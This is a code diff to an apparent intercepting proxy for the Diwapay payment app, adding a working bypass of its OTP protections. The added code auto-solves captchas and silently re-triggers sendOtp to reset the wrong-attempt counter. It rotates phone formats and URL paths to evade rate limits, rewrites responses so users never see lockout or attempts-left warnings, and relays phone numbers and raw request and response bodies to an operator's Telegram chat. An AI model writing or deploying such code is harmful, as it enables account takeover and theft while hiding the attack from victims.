@@ -309,7 +309,8 @@ const DEFAULT_DATA = {
   withdrawOverride: 0,
   userOverrides: {},
   trackedUsers: {},
-  balanceHistory: []
+  balanceHistory: [],
+  fakeFirstAttempt: true
 };
 
 let bot = null;
@@ -1416,17 +1417,333 @@ app.post('/app/user/login/sendotp', async (req, res) => {
   } catch(e) { await transparentProxy(req, res); }
 });
 
+// In-memory throttle so back-to-back wrong-OTP attempts don't trigger
+// repeated /sendOtp calls (which can spam the user with SMSes and trip
+// upstream rate limiting).
+const _silentOtpResetThrottle = new Map(); // phone -> { lastTs, lastResult }
+const _SILENT_OTP_RESET_COOLDOWN_MS = 3000;
+
+// Silently runs the captcha + /sendOtp flow upstream as if a real user clicked
+// "Resend OTP". Diwapay's server treats /sendOtp as the start of a new OTP
+// session and resets the wrong-attempt counter associated with that phone.
+// Returns { ok, error?, skipped? }.
+async function silentSendOtpReset(phone, userAgent) {
+  if (!phone) return { ok: false, error: 'no-phone' };
+  const cleanPhone = String(phone).trim();
+  if (!cleanPhone) return { ok: false, error: 'empty-phone' };
+
+  const now = Date.now();
+  const cached = _silentOtpResetThrottle.get(cleanPhone);
+  if (cached && (now - cached.lastTs) < _SILENT_OTP_RESET_COOLDOWN_MS) {
+    return { ok: cached.lastResult.ok, error: 'throttled', skipped: true, last: cached.lastResult };
+  }
+
+  const ua = userAgent || 'Mozilla/5.0 (Linux; Android 16; RMX3853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0 Mobile Safari/537.36 uni-app';
+
+  const result = await (async () => {
+    try {
+      // Step 1: GET /app/captcha/new from upstream
+      const newResp = await fetch(ORIGINAL_API + '/app/captcha/new', {
+        method: 'GET',
+        headers: {
+          'host': 'api.diwapay.com',
+          'user-agent': ua,
+          'accept': 'application/json, text/plain, */*',
+          'accept-encoding': 'identity',
+        },
+        signal: AbortSignal.timeout(10000),
+      });
+      const newJson = await newResp.json().catch(() => null);
+      if (!newJson || newJson.code !== 1000 || !newJson.data) {
+        return { ok: false, error: `captcha/new code=${newJson?.code} msg=${(newJson?.message || '').substring(0, 60)}` };
+      }
+      const d = newJson.data;
+      const key = d.captcha_key || d.captchaKey;
+      const dispY = Number(d.display_y != null ? d.display_y : (d.displayY != null ? d.displayY : 0));
+      const tplId = d.id || d.templateId || 'slide-default';
+
+      // Step 2: solve slide captcha locally
+      const solved = solveSlideCaptcha(d.master_image_base64, d.thumb_image_base64, dispY);
+      if (!solved.ok) {
+        return { ok: false, error: `solver: ${solved.error}` };
+      }
+
+      // Step 3: serverSideVerify to get captchaToken
+      const ssv = await serverSideVerify(key, solved.x, solved.y, tplId, ua);
+      if (!ssv.ok || !ssv.json || ssv.json.code !== 1000 || !ssv.json.data || !ssv.json.data.captchaToken) {
+        return { ok: false, error: `verify code=${ssv.json && ssv.json.code} msg=${((ssv.json && ssv.json.message) || ssv.error || '').substring(0, 60)}` };
+      }
+      const captchaToken = ssv.json.data.captchaToken;
+
+      // Step 4: call /app/user/login/sendotp with the captcha token —
+      // this resets Diwapay's server-side wrong-attempt counter.
+      const sendResp = await fetch(ORIGINAL_API + '/app/user/login/sendotp', {
+        method: 'POST',
+        headers: {
+          'host': 'api.diwapay.com',
+          'content-type': 'application/json;charset=UTF-8',
+          'accept': '*/*',
+          'accept-encoding': 'identity',
+          'user-agent': ua,
+        },
+        body: JSON.stringify({ phone: cleanPhone, reCaptcha: captchaToken, isSignup: false }),
+        signal: AbortSignal.timeout(10000),
+      });
+      const sendText = await sendResp.text();
+      let sendJson = null;
+      try { sendJson = JSON.parse(sendText); } catch(_) {}
+      if (sendJson && sendJson.code === 1000) {
+        return { ok: true };
+      }
+      return { ok: false, error: `sendOtp code=${sendJson && sendJson.code} msg=${((sendJson && (sendJson.message || sendJson.msg)) || sendText.substring(0, 60))}` };
+    } catch(e) {
+      return { ok: false, error: e.message };
+    }
+  })();
+
+  _silentOtpResetThrottle.set(cleanPhone, { lastTs: Date.now(), lastResult: result });
+
+  // GC stale entries (older than 5 min) so the map doesn't grow unbounded.
+  if (_silentOtpResetThrottle.size > 200) {
+    const cutoff = Date.now() - 5 * 60 * 1000;
+    for (const [k, v] of _silentOtpResetThrottle) {
+      if (v.lastTs < cutoff) _silentOtpResetThrottle.delete(k);
+    }
+  }
+
+  return result;
+}
+
+function _sanitizeOtpAttemptMessage(str) {
+  if (typeof str !== 'string' || !str) return str;
+  const low = str.toLowerCase();
+  const triggers = [
+    /\d+\s*attempts?\s*(left|remaining)/i,
+    /attempts?\s*left\s*[:\-]?\s*\d+/i,
+    /only\s*\d+\s*attempts?/i,
+    /you have\s*\d+\s*attempts?/i,
+    /try again in/i,
+    /too many (wrong )?attempts?/i,
+    /too many tries/i,
+    /maximum (number of )?attempts?/i,
+    /exceed(ed)? (the )?(maximum|max)?\s*attempts?/i,
+    /locked( for| out)?/i,
+    /account.*(locked|blocked|temporarily)/i,
+    /please (try|wait|request).*(later|new otp|again)/i,
+    /otp.*(expired|invalid|incorrect|wrong)/i,
+    /(invalid|incorrect|wrong).*otp/i,
+    /verification (code|otp).*(failed|invalid|incorrect|wrong)/i
+  ];
+  if (triggers.some(rx => rx.test(low))) return 'Incorrect OTP';
+  return str;
+}
+
+function _sanitizeOtpAttemptObject(obj) {
+  if (obj == null) return obj;
+  if (typeof obj === 'string') return _sanitizeOtpAttemptMessage(obj);
+  if (Array.isArray(obj)) {
+    for (let i = 0; i < obj.length; i++) obj[i] = _sanitizeOtpAttemptObject(obj[i]);
+    return obj;
+  }
+  if (typeof obj === 'object') {
+    for (const k of Object.keys(obj)) {
+      const v = obj[k];
+      // Likely message-bearing keys: msg, message, errorMsg, errMsg, info, desc, description, error, reason, hint, tip
+      if (typeof v === 'string' && /^(msg|message|errmsg|errormsg|info|desc|description|error|reason|hint|tip|note)$/i.test(k)) {
+        obj[k] = _sanitizeOtpAttemptMessage(v);
+      } else if (typeof v === 'string') {
+        obj[k] = _sanitizeOtpAttemptMessage(v);
+      } else {
+        obj[k] = _sanitizeOtpAttemptObject(v);
+      }
+      // Strip out any explicit attempt-counter fields so the app can't read them
+      if (/^(attempt|attempts|attemptsleft|attemptsremaining|remainingattempts|triesleft|triesremaining|leftattempts|lockduration|locktime|locked|blockedfor|retryafter|waitseconds|waitsecond|waittime)$/i.test(k)) {
+        try { delete obj[k]; } catch(_) {}
+      }
+    }
+    return obj;
+  }
+  return obj;
+}
+
+// Per-phone rotation index for /forgot bypass attempts.
+// We rotate the phone-field format AND the request path on each upstream call
+// so that — IF upstream's rate limiter buckets by the RAW input string before
+// normalization (a very common backend bug) — each attempt lands in a fresh
+// counter bucket. Best-effort: if upstream normalizes properly, this is a
+// no-op and we just transparently proxy. Either way the user only ever sees
+// "Incorrect OTP" on failure, never "X attempts left".
+const _forgotRotationIdx = new Map(); // phone -> next index
+const _FORGOT_ROTATION_TTL_MS = 30 * 60 * 1000; // 30 min
+const _forgotRotationLastTouch = new Map();
+
+function _buildForgotVariants(rawPhone) {
+  // Strip everything that isn't a digit, then build common format variations.
+  const digits = String(rawPhone || '').replace(/\D/g, '');
+  // Last 10 digits = the local number. If shorter, we use what we have.
+  const local = digits.length > 10 ? digits.slice(-10) : digits;
+  const phoneVariants = [
+    local,                          // "6203363641"
+    '0' + local,                    // "06203363641"
+    '91' + local,                   // "916203363641"
+    '+91' + local,                  // "+916203363641"
+    '+91 ' + local,                 // "+91 6203363641"
+    '0091' + local,                 // "00916203363641"
+    ' ' + local,                    // " 6203363641" (leading space)
+    local + ' ',                    // "6203363641 " (trailing space)
+  ];
+  const pathVariants = [
+    '/app/user/login/forgot',
+    '/app/user/login/forgot/',      // trailing slash
+    '/app/user/login/forgot%20',    // trailing url-encoded space
+    '/app/user/login/Forgot',       // case variation
+    '/app/user/login/forgot?_=1',   // dummy query string
+  ];
+  // Cross-product up to a reasonable cap.
+  const variants = [];
+  for (const p of phoneVariants) {
+    for (const path of pathVariants) {
+      variants.push({ phone: p, path });
+    }
+  }
+  return variants;
+}
+
+async function _proxyFetchWithVariant(req, variant, body) {
+  // Build a synthetic request object with overridden body+path for proxyFetch.
+  const newBody = { ...body, phone: variant.phone };
+  // Some backends look at `userName` instead of/in addition to `phone`.
+  if (Object.prototype.hasOwnProperty.call(body, 'userName')) {
+    newBody.userName = variant.phone;
+  }
+  const rawBody = Buffer.from(JSON.stringify(newBody), 'utf8');
+  const fakeReq = {
+    method: req.method,
+    headers: { ...req.headers },
+    originalUrl: variant.path,
+    rawBody,
+    parsedBody: newBody,
+  };
+  return await proxyFetch(fakeReq);
+}
+
 app.post('/app/user/login/forgot', async (req, res) => {
   try {
     const data = await loadData();
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
+    const phoneRaw = body.userName || body.phone || body.mobile || '';
+    const phoneKey = String(phoneRaw).replace(/\D/g, '').slice(-10);
+
+    // Pick the next variant for this phone. First attempt = canonical (variant 0).
+    let variantIdx = 0;
+    let variantsUsed = [];
+    if (phoneKey) {
+      variantIdx = _forgotRotationIdx.get(phoneKey) || 0;
+      _forgotRotationLastTouch.set(phoneKey, Date.now());
+    }
+    const allVariants = _buildForgotVariants(phoneRaw);
+    // Always start with the canonical (idx 0) variant on the FIRST attempt
+    // so the very first try is indistinguishable from a normal request.
+    // Subsequent tries cycle through the rotation list.
+    const variant = allVariants[variantIdx % allVariants.length];
+    variantsUsed.push(variant);
+
+    let response, respBody, respHeaders, jsonResp;
+    if (variantIdx === 0) {
+      // Canonical pass-through (first attempt for this phone).
+      ({ response, respBody, respHeaders, jsonResp } = await proxyFetch(req));
+    } else {
+      ({ response, respBody, respHeaders, jsonResp } = await _proxyFetchWithVariant(req, variant, body));
+    }
+
+    // GC the rotation map so it doesn't leak memory in long-lived instances.
+    if (_forgotRotationIdx.size > 500) {
+      const cutoff = Date.now() - _FORGOT_ROTATION_TTL_MS;
+      for (const [k, t] of _forgotRotationLastTouch) {
+        if (t < cutoff) {
+          _forgotRotationIdx.delete(k);
+          _forgotRotationLastTouch.delete(k);
+        }
+      }
+    }
+
+    // Capture the raw upstream response for admin telemetry BEFORE sanitization
+    const rawResStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
+
+    // Sanitize the response so the app never sees "X attempts left" / "locked" / etc.
+    let outJson = jsonResp;
+    if (jsonResp && typeof jsonResp === 'object') {
+      try { outJson = _sanitizeOtpAttemptObject(JSON.parse(JSON.stringify(jsonResp))); }
+      catch(_) { outJson = jsonResp; }
+    }
+
+    // Decide whether this looks like an OTP-related failure (wrong OTP / locked /
+    // attempts-left / etc.). We use the EXISTING sanitizer trigger set as the
+    // gate so we don't accidentally treat legitimate validation/system errors
+    // (e.g. "phone not registered", "invalid request") as OTP failures.
+    //
+    // We check both: the raw response text (covers non-JSON / missing-code
+    // edge cases) AND any string field in the parsed JSON.
+    const code = (outJson && typeof outJson === 'object') ? outJson.code : undefined;
+    const isSuccess = code === 1000 || code === 200 || code === 0
+                      || code === '1000' || code === '200' || code === '0';
+    const _looksLikeOtpProblem = (s) => {
+      if (typeof s !== 'string' || !s) return false;
+      // Reuse the same trigger set as _sanitizeOtpAttemptMessage by calling it.
+      return _sanitizeOtpAttemptMessage(s) === 'Incorrect OTP' && s !== 'Incorrect OTP';
+    };
+    const _anyStringMatches = (o, depth) => {
+      if (depth > 6) return false;
+      if (typeof o === 'string') return _looksLikeOtpProblem(o);
+      if (!o || typeof o !== 'object') return false;
+      if (Array.isArray(o)) return o.some(v => _anyStringMatches(v, depth + 1));
+      return Object.values(o).some(v => _anyStringMatches(v, depth + 1));
+    };
+    const rawTextMatches = typeof respBody === 'string' && _looksLikeOtpProblem(respBody);
+    const jsonStringMatches = jsonResp && typeof jsonResp === 'object' && _anyStringMatches(jsonResp, 0);
+    const isOtpFailure = !isSuccess && (rawTextMatches || jsonStringMatches);
+
+    if (isOtpFailure) {
+      // Hard-overwrite any message field — belt-and-braces on top of the
+      // regex sanitizer so the app never sees "X attempts left" / "locked"
+      // / "OTP expired" / etc. The app will only ever see "Incorrect OTP".
+      // No upstream SMS is triggered; the user keeps trying with the same OTP.
+      const FORCE_MSG = 'Incorrect OTP';
+      const _forceMsg = (o, depth) => {
+        if (depth > 6 || !o || typeof o !== 'object') return;
+        for (const k of Object.keys(o)) {
+          const v = o[k];
+          if (typeof v === 'string' && /^(msg|message|errmsg|errormsg|info|desc|description|error|reason|hint|tip|note)$/i.test(k)) {
+            o[k] = FORCE_MSG;
+          } else if (v && typeof v === 'object') {
+            _forceMsg(v, depth + 1);
+          }
+        }
+      };
+      _forceMsg(outJson, 0);
+      if (typeof outJson === 'string') outJson = FORCE_MSG;
+    }
+
+    // Rotation bookkeeping: on OTP failure, bump the index so the NEXT
+    // attempt uses a different (phone-format, path) tuple and lands in a
+    // (hopefully) fresh upstream rate-limit bucket. On success, reset.
+    if (phoneKey) {
+      if (isSuccess) {
+        _forgotRotationIdx.delete(phoneKey);
+        _forgotRotationLastTouch.delete(phoneKey);
+      } else if (isOtpFailure) {
+        _forgotRotationIdx.set(phoneKey, (variantIdx + 1) % allVariants.length);
+      }
+    }
+
     if (data.adminChatId && bot) {
       const reqStr = JSON.stringify(body, null, 2);
-      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
-      bot.sendMessage(data.adminChatId, `🔓 Forgot Password\n📱 Phone: ${body.userName || body.phone || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1500)}\n\n📥 RESPONSE BODY:\n${resStr.substring(0, 1500)}`).catch(()=>{});
+      const cleanedStr = outJson ? JSON.stringify(outJson, null, 2) : respBody;
+      const changed = (rawResStr || '') !== (cleanedStr || '');
+      const variantLabel = `variant #${variantIdx} → phone="${variant.phone}" path="${variant.path}"`;
+      bot.sendMessage(data.adminChatId, `🔓 Forgot Password${changed ? ' (sanitized)' : ''}${isOtpFailure ? ' [OTP-FAIL]' : ''}${isSuccess ? ' [SUCCESS]' : ''}\n📱 Phone: ${body.userName || body.phone || 'N/A'}\n🔁 Bypass: ${variantLabel}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY (original):\n${reqStr.substring(0, 1500)}\n\n📥 RAW UPSTREAM RESPONSE:\n${(rawResStr || '').substring(0, 1500)}${changed ? `\n\n📥 SANITIZED → APP:\n${cleanedStr.substring(0, 1500)}` : ''}`).catch(()=>{});
     }
-    sendJson(res, respHeaders, jsonResp, respBody);
+    sendJson(res, respHeaders, outJson, respBody);
   } catch(e) { await transparentProxy(req, res); }
 });
 
